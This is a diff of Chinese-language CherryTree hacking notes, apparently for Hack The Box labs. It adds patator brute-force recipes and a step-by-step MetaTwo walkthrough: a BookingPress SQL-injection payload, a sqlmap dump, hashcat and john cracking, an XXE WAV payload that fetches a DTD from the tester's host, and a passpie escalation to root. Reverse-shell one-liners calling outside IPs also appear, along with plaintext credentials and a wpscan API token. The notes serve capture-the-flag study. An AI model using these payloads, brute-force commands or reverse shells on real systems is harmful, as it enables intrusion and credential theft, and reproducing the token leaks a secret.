@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?>
 <cherrytree>
   <bookmarks list=""/>
-  <node name="hack_tips" unique_id="21" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1649902547" ts_lastsave="1678071844">
+  <node name="hack_tips" unique_id="21" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1649902547" ts_lastsave="1678174176">
     <rich_text scale="h3" weight="heavy">需要安装的脚本工具：</rich_text>
     <rich_text>
 
@@ -35,6 +35,12 @@
     <rich_text link="file cGhwLXJldmVyc2Utc2hlbGwucGhw" weight="heavy">php-reverse-shell.php</rich_text>
     <rich_text weight="heavy">）等，必下载</rich_text>
     <rich_text>
+</rich_text>
+    <rich_text link="webs https://github.com/lanjelot/patator.git">https://github.com/lanjelot/patator.git</rich_text>
+    <rich_text> 			密码爆破工具，功能强大，但系统自带会报错，直接下载python脚本即可使用。另外 hydra 同样强大好用。
+patator 支持burpsuit保存的请求文件直接爆破（raw_request=&lt;request-file&gt;），支持base64、md5等等加密请求密码（password=_@@_FILE0_@@_ -e _@@_:b64）
+hydra 爆破时可以配置是否自动get获取cookie然后进行post请求（:G= ）,默认会自动先 get，再post. parator 也支持配置，略微麻烦点 accept_cookie=1 before_urls=&lt;请求cookie的url，通常是登录页本身get请求&gt;
+个人感觉 patator 更好用一点
 
 </rich_text>
     <rich_text scale="h3" weight="heavy">• linux:</rich_text>
@@ -273,7 +279,7 @@ msfvenom -l payloads 列出所有 payloads
 • Payloads 页面 Payloads options 中选择密码字典文件
 • 点击右上角 start attack 开始进行爆破
 • 点击 length 列排序，找到返回长度不同的那个请求观察结果</rich_text>
-    <codebox char_offset="4629" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">#include &lt;stdio.h&gt;
+    <codebox char_offset="5001" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="plain-text" highlight_brackets="1" show_line_numbers="0">#include &lt;stdio.h&gt;
 #include &lt;string.h&gt;
 
 int main(int argc, char** argv) {
@@ -283,7 +289,7 @@ int main(int argc, char** argv) {
         return 0;
 }
 </codebox>
-    <codebox char_offset="4774" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="c" highlight_brackets="1" show_line_numbers="0">(gdb) disas main	(显示对应方法的机器代码)
+    <codebox char_offset="5146" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="c" highlight_brackets="1" show_line_numbers="0">(gdb) disas main	(显示对应方法的机器代码)
 Dump of assembler code for function main:
    0x0000000000001139 &lt;+0&gt;:     push   %rbp
    0x000000000000113a &lt;+1&gt;:     mov    %rsp,%rbp
@@ -301,7 +307,7 @@ Dump of assembler code for function main:
    0x0000000000001176 &lt;+61&gt;:    leave  
    0x0000000000001177 &lt;+62&gt;:    ret    
 End of assembler dump.</codebox>
-    <codebox char_offset="4904" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="c" highlight_brackets="1" show_line_numbers="0">(gdb) run $(python2 -c 'print "\x41" * 526')
+    <codebox char_offset="5276" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="c" highlight_brackets="1" show_line_numbers="0">(gdb) run $(python2 -c 'print "\x41" * 526')
 Program received signal SIGSEGV, Segmentation fault.
 0x0000414141414141 in ?? ()
 (gdb) info registers	(查看寄存器信息)
@@ -331,7 +337,7 @@ fs             0x0                 0
 gs             0x0                 0
 </codebox>
   </node>
-  <node name="hack_operation" unique_id="22" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1649905004" ts_lastsave="1678118574">
+  <node name="hack_operation" unique_id="22" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1649905004" ts_lastsave="1678198107">
     <rich_text>1. 生成 rsa private key 并解密加密的文件
 ./RsaCtfTool.py --publickey ~/Weak_RSA/key.pub --uncipherfile ~/Weak_RSA/flag.enc --attack wiener --private
 
@@ -360,7 +366,7 @@ sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
 
 4. 远程代码执行，反弹 shell
 bash -c "bash -i &gt;&amp; /dev/tcp/10.10.16.8/9001 0&gt;&amp;1"
-bash -i &gt;&amp; /dev/tcp/10.10.14.25/1234 0&gt;&amp;1
+bash -i &gt;&amp; /dev/tcp/10.10.16.7/9001 0&gt;&amp;1
 nc -c bash 10.10.14.25 1234
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.15 1234 &gt;/tmp/f        (good!)
 
@@ -470,7 +476,35 @@ lrwxrwxrwx 1 root root 4 Sep  1 22:11 /bin/sh -&gt; </rich_text>
     <rich_text>" -t 64 -V
 incorrect	指登录失败需要筛选的字符，根据具体返回的页面内容添加
 H=  是指添加 header，需要放在错误字符筛选后添加
-G=	指不进行预先cookie请求，如果不加G= （后有个空格），每次进行post请求之前都会进行一次 get 请求获取 cookie 数据，然后放到 post 请求头中进行下一步请求</rich_text>
+G=	指不进行预先cookie请求，如果不加G= （后有个空格），每次进行post请求之前都会进行一次 get 请求获取 cookie 数据，然后放到 post 请求头中进行下一步请求
+
+20. patator 使用 
+./patator.py http_fuzz url=</rich_text>
+    <rich_text link="webs http://nineveh.htb/department/login.php">http://nineveh.htb/department/login.php</rich_text>
+    <rich_text> method=POST body="username=admin&amp;password=FILE0" 0=../pass.txt proxy=</rich_text>
+    <rich_text link="webs http://127.0.0.1:8080">http://127.0.0.1:8080</rich_text>
+    <rich_text> -x ignore:fgrep='Invalid' -t 50  正常爆破http登录页
+./patator.py http_fuzz url=</rich_text>
+    <rich_text link="webs http://nineveh.htb/department/login.php">http://nineveh.htb/department/login.php</rich_text>
+    <rich_text> method=POST body="username=admin&amp;password=FILE0" 0=../pass.txt proxy=</rich_text>
+    <rich_text link="webs http://127.0.0.1:8080">http://127.0.0.1:8080</rich_text>
+    <rich_text> -x ignore:fgrep='Invalid' -t 50 </rich_text>
+    <rich_text foreground="#e0e01b1b2424">accept_cookie=1 before_urls=</rich_text>
+    <rich_text link="webs http://nineveh.htb/department/login.php" foreground="#e0e01b1b2424">http://nineveh.htb/department/login.php</rich_text>
+    <rich_text>               爆破前先进行 get 请求获取cookie作为主请求的cookie参数，相当与 hydra 中的 G= 参数不加的默认策略
+./patator.py http_fuzz </rich_text>
+    <rich_text foreground="#e0e01b1b2424">raw_request=../req.txt</rich_text>
+    <rich_text> 0=../pass.txt proxy=</rich_text>
+    <rich_text link="webs http://127.0.0.1:8080">http://127.0.0.1:8080</rich_text>
+    <rich_text> -x ignore:fgrep='Invalid' -t 50       根据 burpsuit 导出的请求信息进行爆破，使用起来方便，但可能存在的问题是：如果之前的一个请求爆破成功，后续的请求因为 cookie都相同，所以后续的请求结果不管密码是否正确也都会返回成功
+
+/root/patator/patator.py ftp_login host=10.10.11.186 user=</rich_text>
+    <rich_text foreground="#e0e01b1b2424">COMBO00</rich_text>
+    <rich_text> password=COMBO01 0=/root/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -C ':' -x ignore:mesg='Login incorrect.' -x ignore,reset,retry:code=500 timeout=15 -d     对于像 user:password 这种组合型的凭证文件，需要用  COMBO 标签来表示对应的字段，注意指定文件的 0,1,3.....要按顺序，不能直接设置 1=pass.txt。
+
+21. curl 设置代理
+curl 'http://metapress.htb/wp-admin/admin-ajax.php' --data 'action=bookingpress_front_get_category_services&amp;_wpnonce=d0a365ea46&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -' </rich_text>
+    <rich_text weight="heavy">--proxy "http://127.0.0.1:8080"</rich_text>
   </node>
   <node name="linux" unique_id="105" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1675223633" ts_lastsave="1677641160">
     <rich_text weight="heavy">Linux 最基本的操作</rich_text>
@@ -1198,7 +1232,7 @@ root: 1703b8a3c9a8dde879942c79d02fd3a0</rich_text>
     </node>
   </node>
   <node name="Nineveh" unique_id="23" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1649930488" ts_lastsave="1650421989">
-    <node name="Enumeration" unique_id="24" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1649930507" ts_lastsave="1678123313">
+    <node name="Enumeration" unique_id="24" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1649930507" ts_lastsave="1678174237">
       <rich_text>1. nmap -sV -sC -Pn 10.10.10.43
 Starting Nmap 7.92 ( </rich_text>
       <rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
@@ -1238,16 +1272,6 @@ hydra -l none -P /root/gh_tools/SecLists/Passwords/Common-Credentials/10k-most-c
 [80][http-post-form] host: 10.10.10.43   login: none   password: </rich_text>
       <rich_text foreground="#eded33333b3b">1q2w3e4r5t</rich_text>
       <rich_text>
-
-patator http_fuzz proxy_type=http proxy=127.0.0.1:8080 url=</rich_text>
-      <rich_text link="webs http://10.0.0.1/phpmyadmin/index.php">http://10.</rich_text>
-      <rich_text>10.10.43/department/login.php method=POST body='username=admin&amp;password=FILE0' 0=pass.txt -x ignore:fgrep='Invalid'  -t 50
-
-patator http_fuzz url=http://10.10.10.43/department/login.php  method=POST body="username=admin&amp;password=FILE0" 0=pass.txt http_proxy=</rich_text>
-      <rich_text link="webs http://127.0.0.1:8080">http://127.0.0.1:8080</rich_text>
-      <rich_text>
-
-patator http_fuzz raw_request=req.txt 0=pass.txt
 
 
 4. hydra https login page
@@ -4300,7 +4324,7 @@ end
          method_id: :resolve
 </codebox>
   </node>
-  <node name="MetaTwo" unique_id="113" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1678071809" ts_lastsave="1678118681">
+  <node name="MetaTwo" unique_id="113" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1678071809" ts_lastsave="1678275330">
     <rich_text>1. ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.186 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//) 
 nmap -sC -sV -p $ports 10.10.11.186 -Pn
 Starting Nmap 7.93 ( </rich_text>
@@ -4337,66 +4361,199 @@ SF:r\n");
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 
-
- |
- | [!] Title: WP &lt; 6.0.3 - SQLi in WP_Date_Query
- |     Fixed in: 5.6.10
- |     References:
- |      - </rich_text>
-    <rich_text link="webs https://wpscan.com/vulnerability/1da03338-557f-4cb6-9a65-3379df4cce47">https://wpscan.com/vulnerability/1da03338-557f-4cb6-9a65-3379df4cce47</rich_text>
-    <rich_text>
- |      - </rich_text>
-    <rich_text link="webs https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/">https://wordpress.org/news/2022/10/wordpress-6-0-3-security-release/</rich_text>
-    <rich_text>
- |      - </rich_text>
-    <rich_text link="webs https://github.com/WordPress/wordpress-develop/commit/d815d2e8b2a7c2be6694b49276ba3eee5166c21f">https://github.com/WordPress/wordpress-develop/commit/d815d2e8b2a7c2be6694b49276ba3eee5166c21f</rich_text>
-    <rich_text>
-
-
-[!] Title: WP &lt;= 6.1.1 - Unauthenticated Blind SSRF via DNS Rebinding
- |     References:
- |      - </rich_text>
-    <rich_text link="webs https://wpscan.com/vulnerability/c8814e6e-78b3-4f63-a1d3-6906a84c1f11">https://wpscan.com/vulnerability/c8814e6e-78b3-4f63-a1d3-6906a84c1f11</rich_text>
-    <rich_text>
- |      - </rich_text>
-    <rich_text link="webs https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3590">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3590</rich_text>
-    <rich_text>
- |      - </rich_text>
-    <rich_text link="webs https://blog.sonarsource.com/wordpress-core-unauthenticated-blind-ssrf/">https://blog.sonarsource.com/wordpress-core-unauthenticated-blind-ssrf/</rich_text>
-    <rich_text>
-
-
-
-admin
+2. 先用dirbuster扫描目录，发现登录页面 /wp-login.php,因为登录页面用户名错误还是密码错误有明确提示，所以尝试用 hydra、patator 爆破用户名和密码，想登录进去看。未成功。
 
 hydra -l admin -P pass.txt </rich_text>
     <rich_text link="webs http://metapress.htb/wp-login.php">metapress.htb</rich_text>
     <rich_text> http-post-form "/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Fmetapress.htb%2Fwp-admin%2F&amp;testcookie=1:incorrect:H=Cookie\: PHPSESSID=l7ts8pn1umfr8519pgotlp4mlf; wordpress_test_cookie=WP%20Cookie%20check:G= " -t 64
 
+./patator.py http_fuzz raw_request=/home/kali/works/htb/linux/MetaTwo/req_name.txt 0=/root/SecLists/Usernames/Names/names.txt  proxy=</rich_text>
+    <rich_text link="webs http://127.0.0.1:8080">http://127.0.0.1:8080</rich_text>
+    <rich_text> -x ignore:fgrep='Unknown username' -t 30
 
-H=Cookie\: PHPSESSID=l7ts8pn1umfr8519pgotlp4mlf; wordpress_test_cookie=WP%20Cookie%20check
+/root/patator/patator.py http_fuzz raw_request=/home/kali/works/htb/linux/MetaTwo/req_name.txt 0=/root/SecLists/Passwords/Common-Credentials/best1050.txt proxy=</rich_text>
+    <rich_text link="webs http://127.0.0.1:8080">http://127.0.0.1:8080</rich_text>
+    <rich_text> -x ignore:fgrep='incorrect' -t 30
 
-Cookie: PHPSESSID=l7ts8pn1umfr8519pgotlp4mlf; wordpress_test_cookie=WP%20Cookie%20check
+/root/patator/patator.py ftp_login host=10.0.0.1 user=COMBO10 password=COMBO11 1=/root/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -x ignore:mesg='Login incorrect.' -x ignore,reset,retry:code=500
 
-POST /wp-login.php HTTP/1.1&#13;
-Host: metapress.htb&#13;
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0&#13;
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8&#13;
-Accept-Language: en-US,en;q=0.5&#13;
-Accept-Encoding: gzip, deflate&#13;
-Referer: </rich_text>
-    <rich_text link="webs http://metapress.htb/wp-login.php">http://metapress.htb/wp-login.php</rich_text>
-    <rich_text>&#13;
-Content-Type: application/x-www-form-urlencoded&#13;
-Content-Length: 103&#13;
-Origin: </rich_text>
+只确认一个登录用户 是 admin
+
+3. 尝试用 admin 爆破 21 ftp 未成功，有限制，每次登录请求都有等待时间大概 15s，多次失败还会被锁。 22 ssh 不是低于 7.7 的版本也无法爆破。
+
+4. wpscan --url </rich_text>
+    <rich_text link="webs http://metapress.htb/">http://metapress.htb/</rich_text>
+    <rich_text> --disable-tls-checks --api-token M5lUsB15udUv2nqRGHKBrzXaIilktUKoiDbVpPQXzOs -e ap 扫描 wordpress 相关已知漏洞，尝试了无需授权的sql注入漏洞，未成功
+
+5. 实在找到到突破点，查看了 htb writeup，从 bookingpress 寻找到突破口。翻看主页面 source code，发现是
+google 搜索到 BookingPress &lt; 1.0.11 - Unauthenticated SQL Injection 漏洞，通过下面的博客提示，成功发现 sql 注入点，并获取到用户表信息
+</rich_text>
+    <rich_text link="webs https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357">https://wpscan.com/vulnerability/388cd42d-b61a-42a4-8604-99b812db2357</rich_text>
+    <rich_text>
+
+curl -i '</rich_text>
+    <rich_text link="webs https://example.com/wp-admin/admin-ajax.php'">http://metapress.htb/wp-admin/admin-ajax.php'</rich_text>
+    <rich_text> --data 'action=bookingpress_front_get_category_services&amp;_wpnonce=d0a365ea46&amp;category_id=33&amp;total_service=-7502) UNION ALL SELECT @@version,@@version_comment,@@version_compile_os,1,2,3,4,5,6-- -'
+
+sqlmap -u  '</rich_text>
+    <rich_text link="webs https://example.com/wp-admin/admin-ajax.php'">http://metapress.htb/wp-admin/admin-ajax.php'</rich_text>
+    <rich_text> --data 'action=bookingpress_front_get_category_services&amp;_wpnonce=d0a365ea46&amp;category_id=33&amp;total_service=-7502*' --batch --dump
+
+
+Database: blog
+Table: wp_users
+[2 entries]
++----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
+| ID | user_url             | user_pass                          | user_email            | user_login | user_status | display_name | user_nicename | user_registered     | user_activation_key |
++----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
+| 1  | </rich_text>
     <rich_text link="webs http://metapress.htb">http://metapress.htb</rich_text>
-    <rich_text>&#13;
-Connection: close&#13;
-Cookie: PHPSESSID=a83jpbg8tovuglvoe9bdd1vea5; wordpress_test_cookie=WP%20Cookie%20check&#13;
-Upgrade-Insecure-Requests: 1&#13;
-&#13;
-log=admin&amp;pwd=adnmin&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Fmetapress.htb%2Fwp-admin%2F&amp;testcookie=1</rich_text>
+    <rich_text> | $P$BGrGrgf2wToBS79i07Rk9sN4Fzk.TV. | admin@metapress.htb   | admin      | 0           | admin        | admin         | 2022-06-23 17:58:28 | &lt;blank&gt;             |
+| 2  | &lt;blank&gt;              | $P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70 | manager@metapress.htb | manager    | 0           | manager      | manager       | 2022-06-23 18:07:55 | &lt;blank&gt;             |
++----+----------------------+------------------------------------+-----------------------+------------+-------------+--------------+---------------+---------------------+---------------------+
+
+6. 尝试破解两个密码hash，只成功一个 manager 的。
+hashcat --hook-threads=30 hash.txt /usr/share/wordlists/rockyou.txt
+
+$P$B4aNM28N0E.tMy/JIcnVMZbGcU16Q70:</rich_text>
+    <rich_text foreground="#e0e01b1b2424">partylikearockstar</rich_text>
+    <rich_text> 
+
+7. 登录成功后，继续验证已知的需要授权用户的漏洞，如下 XXE 漏洞
+
+wpscan --url </rich_text>
+    <rich_text link="webs http://metapress.htb/">http://metapress.htb/</rich_text>
+    <rich_text> --disable-tls-checks --api-token M5lUsB15udUv2nqRGHKBrzXaIilktUKoiDbVpPQXzOs -e ap
+[!] Title: WordPress 5.6-5.7 - Authenticated XXE Within the Media Library Affecting PHP 8
+ |     Fixed in: 5.6.3
+ |     References:
+ |      - </rich_text>
+    <rich_text link="webs https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5">https://wpscan.com/vulnerability/cbbe6c17-b24e-4be4-8937-c78472a138b5</rich_text>
+    <rich_text>
+ |      - </rich_text>
+    <rich_text link="webs https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29447">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29447</rich_text>
+    <rich_text>
+....................................
+
+搜索该漏洞对应的  poc ，通过下面博客的详细描述，成功验证该漏洞，并获得 ssh 登录用户信息
+</rich_text>
+    <rich_text link="webs https://github.com/motikan2010/CVE-2021-29447">https://github.com/motikan2010/CVE-2021-29447</rich_text>
+    <rich_text>
+
+echo -en 'RIFF\xb8\x00\x00\x00WAVEiXML\x7b\x00\x00\x00&lt;?xml version="1.0"?&gt;&lt;!DOCTYPE ANY[&lt;!ENTITY % remote SYSTEM '"'"'</rich_text>
+    <rich_text link="webs http://192.168.1.7:9123/evil.dtd'">http://10.10.16.7:9001/evil.dtd'</rich_text>
+    <rich_text>"'"'&gt;%remote;%init;%trick;]&gt;\x00' &gt; payload.wav
+
+</rich_text>
+    <rich_text foreground="#e0e01b1b2424">jnelson</rich_text>
+    <rich_text>:x:1000:1000:jnelson,,,:/home/jnelson:/bin/bash
+
+通过 writeup 提示获取该配置信息，得到网站根目录 
+/etc/nginx/sites-enabled/default
+
+server {
+
+        listen 80;
+        listen [::]:80;
+
+        root </rich_text>
+    <rich_text foreground="#e0e01b1b2424">/var/www/metapress.htb/blog</rich_text>
+    <rich_text>;
+
+通过下面博客关于 wordpress 重要文件的说明以及 writeup 提示，找到数据库配置文件 wp-config.php，但之前尝试多次 wp-login.php 获取失败是因为该文件较大，可能无法传输，所以失败。
+</rich_text>
+    <rich_text link="webs https://zhuanlan.zhihu.com/p/60461351">https://zhuanlan.zhihu.com/p/60461351</rich_text>
+    <rich_text>
+/var/www/metapress.htb/blog/wp-config.php
+
+&lt;?php
+/** The name of the database for WordPress */
+define( 'DB_NAME', 'blog' );
+....................................
+define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );
+.............................................
+define( 'FS_METHOD', 'ftpext' );
+define( 'FTP_USER', '</rich_text>
+    <rich_text foreground="#e0e01b1b2424">metapress.htb</rich_text>
+    <rich_text>' );
+define( 'FTP_PASS', '</rich_text>
+    <rich_text foreground="#e0e01b1b2424">9NYS_ii@FyL_p5M2NvJ</rich_text>
+    <rich_text>' );
+define( 'FTP_HOST', 'ftp.metapress.htb' );
+define( 'FTP_BASE', 'blog/' );
+define( 'FTP_SSL', false );
+
+用上述用户名和密码登录 ftp 服务，发现该目录下的另一个目录中 mailer 中 send_email.php 文件，并获取 jnelson 的一个密码
+
+$mail-&gt;Username = "jnelson@metapress.htb";                 
+$mail-&gt;Password = "</rich_text>
+    <rich_text foreground="#e0e01b1b2424">Cb4_JmWM8zUZWMu@Ys</rich_text>
+    <rich_text>";    
+
+用该密码尝试 ssh 登录jnelson，成功！！！
+ssh jnelson@10.10.11.186     (with pass: Cb4_JmWM8zUZWMu@Ys)
+
+user flag: </rich_text>
+    <rich_text foreground="#e0e01b1b2424">fd3fd60ab3eb8cd82ca60421a3c6065e</rich_text>
+    <rich_text>
+
+8. Pri-Escalation
+jnelson目录下有个特殊的目录 .passpie ，通过了解，该工具是一个密码管理和生成软件，该软件使用 gpg 进行加密解密。
+jnelson@meta2:~/.passpie$ ls -lAR
+.:
+total 16
+-r-xr-x--- 1 jnelson jnelson    3 Jun 26  2022 .config
+-r-xr-x--- 1 jnelson jnelson 5243 Jun 26  2022 .keys
+dr-xr-x--- 2 jnelson jnelson 4096 Oct 25 12:52 ssh
+
+./ssh:
+total 8
+-r-xr-x--- 1 jnelson jnelson 683 Oct 25 12:52 jnelson.pass
+-r-xr-x--- 1 jnelson jnelson 673 Oct 25 12:52 root.pass
+
+.keys 文件是 gpg 的加密解密的私有以及公有 key
+将其私有key拷贝到本地并用 gpg2john、john 进行解密，得到key的使用密码，该密码同样是 passpie 获取加密密码的密码 （Passphrase:  《密码》）
+
+gpg2john pri_encrypt.txt &gt; gpg_hash
+ john gpg_hash -w=/usr/share/wordlists/rockyou.txt 
+</rich_text>
+    <rich_text foreground="#e0e01b1b2424">blink182</rich_text>
+    <rich_text>         (Passpie) 
+
+执行 passpie 导出密码的指令获取到 root 密码。不能使用 passpie copy root@ssh 命令复制密码到粘贴版，可能是因为服务器将复制到粘贴版的功能禁用了。
+passpie export  abc
+
+cat abc 
+credentials:
+- comment: ''
+  fullname: root@ssh
+  login: root
+  modified: 2022-06-26 08:58:15.621572
+  name: ssh
+  password: !!python/unicode '</rich_text>
+    <rich_text foreground="#e0e01b1b2424">p7qfAZt4_A1xo_0x</rich_text>
+    <rich_text>'
+- comment: ''
+  fullname: jnelson@ssh
+  login: jnelson
+  modified: 2022-06-26 08:58:15.514422
+  name: ssh
+  password: !!python/unicode 'Cb4_JmWM8zUZWMu@Ys'
+handler: passpie
+version: 1.0
+
+尝试用 ssh root@10.10.11.186 登录失败，以为该密码不对，可能是因为 ssh 配置不允许 root 登录。通常 root 登录是不被允许的。通过 su - 可以直接切到 root 用户。
+su -
+Password: 
+root@meta2:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@meta2:~# ls
+restore  root.txt
+root@meta2:~# cat root.txt 
+</rich_text>
+    <rich_text foreground="#e0e01b1b2424">13ba227ae7d6b1e0c8ca6aa762432181</rich_text>
+    <rich_text>
+</rich_text>
   </node>
   <node name="Legacy-Windows" unique_id="71" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1664271968" ts_lastsave="1675928583">
     <rich_text>1. nmap -sV -sC 10.10.10.4              
